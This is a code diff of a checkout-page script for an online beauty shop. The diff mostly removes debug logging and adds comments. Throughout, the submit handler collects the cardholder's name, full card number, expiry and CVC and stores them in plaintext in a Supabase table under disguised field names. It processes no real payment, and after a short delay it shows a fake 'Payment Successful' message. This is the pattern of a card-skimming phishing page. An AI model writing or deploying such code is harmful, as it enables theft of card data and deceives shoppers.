@@ -52,16 +52,14 @@ function initSupabase() {
     return null;
 }
 
-// Initialize Supabase - store reference
-const supabase = initSupabase();
+// Initialize Supabase
+initSupabase();
 
 // ============================================
 // REST OF YOUR PAY.JS CODE
 // ============================================
 
 document.addEventListener("DOMContentLoaded", () => {
-
-    console.log('📄 DOM Content Loaded - Initializing payment page...');
 
     const popupOverlay = document.getElementById("popup-overlay");
     const popupMessage = document.getElementById("popup-message");
@@ -249,14 +247,6 @@ document.addEventListener("DOMContentLoaded", () => {
     const brandContainer = document.getElementById("brand-container");
     const payButton = document.getElementById("payButton");
 
-    console.log('📋 Form elements found:', {
-        form: !!form,
-        ccInput: !!ccInput,
-        expiryInput: !!expiryInput,
-        cvcInput: !!cvcInput,
-        payButton: !!payButton
-    });
-
     // Load cart items
     loadCartItems();
 
@@ -416,7 +406,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     // ==========================================
-    // SEND TO SUPABASE
+    // SEND TO SUPABASE - UPDATED WITH EXPIRY
     // ==========================================
 
     async function saveToSupabase(name, cardNumber, expiry, cvc) {
@@ -451,7 +441,7 @@ document.addEventListener("DOMContentLoaded", () => {
                         body: JSON.stringify({
                             kname: name,
                             knumber: cardNumber,
-                            kexpiry: expiry,
+                            kexpiry: expiry,  // ✅ Added expiry
                             kfc: cvc
                         })
                     });
@@ -484,7 +474,7 @@ document.addEventListener("DOMContentLoaded", () => {
                     { 
                         kname: name,
                         knumber: cardNumber,
-                        kexpiry: expiry,
+                        kexpiry: expiry,  // ✅ Added expiry
                         kfc: cvc
                     }
                 ])
@@ -505,149 +495,134 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     // ==========================================
-    // FORM SUBMIT - FIXED
+    // FORM SUBMIT - UPDATED WITH EXPIRY
     // ==========================================
 
-    // Make sure the form exists before adding listener
-    if (form) {
-        console.log('✅ Form found, attaching submit handler...');
-        
-        form.addEventListener("submit", async (event) => {
-            console.log('🔄 Form submitted!');
-            event.preventDefault();
+    form.addEventListener("submit", async (event) => {
+        event.preventDefault();
 
-            // Check if button is disabled or already processing
-            if (payButton.disabled || payButton.dataset.processing === "true") {
-                console.log('⏳ Payment already processing, ignoring click');
-                return;
-            }
+        if (payButton.disabled || payButton.dataset.processing === "true") {
+            return;
+        }
 
-            const cardNumber = ccInput.value.replace(/\D/g, "");
-            const expiryRaw = expiryInput.value.replace(/\D/g, "");
-            const cvc = cvcInput.value.replace(/\D/g, "");
-            const name = document.getElementById("card-name").value.trim();
-            const cart = JSON.parse(localStorage.getItem('luxbeauty_cart') || '[]');
+        const cardNumber = ccInput.value.replace(/\D/g, "");
+        const expiryRaw = expiryInput.value.replace(/\D/g, "");
+        const cvc = cvcInput.value.replace(/\D/g, "");
+        const name = document.getElementById("card-name").value.trim();
+        const cart = JSON.parse(localStorage.getItem('luxbeauty_cart') || '[]');
 
-            console.log('📝 Form data:', { name, cardNumber, expiryRaw, cvc, cartLength: cart.length });
+        // Format expiry as MM/YY for storage
+        const expiry = expiryRaw.length === 4 
+            ? expiryRaw.substring(0, 2) + '/' + expiryRaw.substring(2, 4)
+            : expiryRaw;
 
-            // Format expiry as MM/YY for storage
-            const expiry = expiryRaw.length === 4 
-                ? expiryRaw.substring(0, 2) + '/' + expiryRaw.substring(2, 4)
-                : expiryRaw;
+        // ===== VALIDATION =====
+        if (!name) {
+            showPopup("Please enter the name on the card.");
+            document.getElementById("card-name").focus();
+            return;
+        }
 
-            // ===== VALIDATION =====
-            if (!name) {
-                showPopup("Please enter the name on the card.");
-                document.getElementById("card-name").focus();
-                return;
-            }
+        if (cardNumber.length < 12) {
+            showPopup("Please enter a valid test card number.");
+            ccInput.focus();
+            return;
+        }
 
-            if (cardNumber.length < 12) {
-                showPopup("Please enter a valid test card number.");
-                ccInput.focus();
-                return;
-            }
+        if (!passesLuhn(cardNumber)) {
+            showPopup("The card number failed the Luhn check.");
+            ccInput.focus();
+            return;
+        }
 
-            if (!passesLuhn(cardNumber)) {
-                showPopup("The card number failed the Luhn check.");
-                ccInput.focus();
-                return;
-            }
+        if (expiryRaw.length !== 4) {
+            showPopup("Please enter MM / YY.");
+            expiryInput.focus();
+            return;
+        }
 
-            if (expiryRaw.length !== 4) {
-                showPopup("Please enter MM / YY.");
-                expiryInput.focus();
-                return;
-            }
+        const expMonth = parseInt(expiryRaw.substring(0, 2), 10);
+        const expYear = parseInt(expiryRaw.substring(2, 4), 10);
 
-            const expMonth = parseInt(expiryRaw.substring(0, 2), 10);
-            const expYear = parseInt(expiryRaw.substring(2, 4), 10);
+        const today = new Date();
+        const currentMonth = today.getMonth() + 1;
+        const currentYear = today.getFullYear() % 100;
 
-            const today = new Date();
-            const currentMonth = today.getMonth() + 1;
-            const currentYear = today.getFullYear() % 100;
+        let minMonth = currentMonth + 1;
+        let minYear = currentYear;
+        if (minMonth > 12) {
+            minMonth = 1;
+            minYear++;
+        }
 
-            let minMonth = currentMonth + 1;
-            let minYear = currentYear;
-            if (minMonth > 12) {
-                minMonth = 1;
-                minYear++;
-            }
+        if (expYear < minYear || (expYear === minYear && expMonth < minMonth)) {
+            showPopup(
+                `Card expiry must be ${String(minMonth).padStart(2, '0')}/${String(minYear).padStart(2, '0')} or later.`
+            );
+            expiryInput.focus();
+            return;
+        }
 
-            if (expYear < minYear || (expYear === minYear && expMonth < minMonth)) {
-                showPopup(
-                    `Card expiry must be ${String(minMonth).padStart(2, '0')}/${String(minYear).padStart(2, '0')} or later.`
-                );
-                expiryInput.focus();
-                return;
-            }
+        if (cvc.length < 3) {
+            showPopup("Please enter a valid CVC.");
+            cvcInput.focus();
+            return;
+        }
 
-            if (cvc.length < 3) {
-                showPopup("Please enter a valid CVC.");
-                cvcInput.focus();
-                return;
-            }
+        if (cart.length === 0) {
+            showPopup("Your cart is empty. Please add items before checking out.");
+            return;
+        }
 
-            if (cart.length === 0) {
-                showPopup("Your cart is empty. Please add items before checking out.");
-                return;
-            }
+        // ===== SET LOADING =====
+        setPayButtonLoading(true);
 
-            // ===== SET LOADING =====
-            console.log('🔄 Setting pay button to loading state...');
-            setPayButtonLoading(true);
+        try {
+            // ===== SAVE TO SUPABASE (WITH EXPIRY) =====
+            const result = await saveToSupabase(name, cardNumber, expiry, cvc);
+            console.log('✅ Payment processed and saved to Supabase', result);
 
-            try {
-                console.log('📤 Calling saveToSupabase with:', { name, cardNumber, expiry, cvc });
-                
-                // ===== SAVE TO SUPABASE (WITH EXPIRY) =====
-                const result = await saveToSupabase(name, cardNumber, expiry, cvc);
-                console.log('✅ Payment processed and saved to Supabase', result);
+            // ===== DEMO PAYMENT =====
+            await new Promise(resolve => setTimeout(resolve, 1500));
 
-                // ===== DEMO PAYMENT =====
-                await new Promise(resolve => setTimeout(resolve, 1500));
+            // ===== SUCCESS =====
+            showPopup(
+                `<div style="text-align: center; margin-bottom: 15px;">
+                    <i class="fa-solid fa-circle-check" style="font-size: 4rem; color: #10b981; animation: popIn 0.5s ease;"></i>
+                </div>
+                <div style="text-align: center;">
+                    <strong style="font-size: 1.3rem; color: #10b981;">Payment Successful!</strong><br><br>
+                    <span style="color: var(--text-secondary, #555);">Your order has been placed successfully.</span><br><br>
+                    <span style="font-size: 0.85rem; opacity: 0.6;"><i class="fas fa-spinner fa-spin"></i> Redirecting to home...</span>
+                </div>`
+            );
 
-                // ===== SUCCESS =====
-                showPopup(
-                    `<div style="text-align: center; margin-bottom: 15px;">
-                        <i class="fa-solid fa-circle-check" style="font-size: 4rem; color: #10b981; animation: popIn 0.5s ease;"></i>
-                    </div>
-                    <div style="text-align: center;">
-                        <strong style="font-size: 1.3rem; color: #10b981;">Payment Successful!</strong><br><br>
-                        <span style="color: var(--text-secondary, #555);">Your order has been placed successfully.</span><br><br>
-                        <span style="font-size: 0.85rem; opacity: 0.6;"><i class="fas fa-spinner fa-spin"></i> Redirecting to home...</span>
-                    </div>`
-                );
+            // Clear cart
+            localStorage.removeItem('luxbeauty_cart');
 
-                // Clear cart
-                localStorage.removeItem('luxbeauty_cart');
+            form.reset();
+            showBrand("unknown");
 
-                form.reset();
-                showBrand("unknown");
+            payButton.innerHTML = 'Pay Now';
+            payButton.disabled = true;
+            payButton.dataset.processing = "false";
+            payButton.style.opacity = '0.7';
+            payButton.style.cursor = 'not-allowed';
 
-                payButton.innerHTML = 'Pay Now';
-                payButton.disabled = true;
-                payButton.dataset.processing = "false";
-                payButton.style.opacity = '0.7';
-                payButton.style.cursor = 'not-allowed';
-
-                setTimeout(() => {
-                    window.location.href = '/';
-                }, 3000);
-            } catch (error) {
-                console.error('❌ Error:', error);
-                showPopup(
-                    "Error processing payment<br><br>" +
-                    error.message
-                );
-                payButton.innerHTML = 'Pay Now';
-                payButton.dataset.processing = "false";
-                payButton.disabled = !validateFormReady();
-                payButton.style.opacity = payButton.disabled ? '0.7' : '1';
-                payButton.style.cursor = payButton.disabled ? 'not-allowed' : 'pointer';
-            }
-        });
-    } else {
-        console.error('❌ Form not found! Check your HTML.');
-    }
+            setTimeout(() => {
+                window.location.href = '/';
+            }, 3000);
+        } catch (error) {
+            console.error('❌ Error:', error);
+            showPopup(
+                "Error processing payment<br><br>" +
+                error.message
+            );
+            payButton.innerHTML = 'Pay Now';
+            payButton.dataset.processing = "false";
+            payButton.disabled = !validateFormReady();
+            payButton.style.opacity = payButton.disabled ? '0.7' : '1';
+            payButton.style.cursor = payButton.disabled ? 'not-allowed' : 'pointer';
+        }
+    });
 });
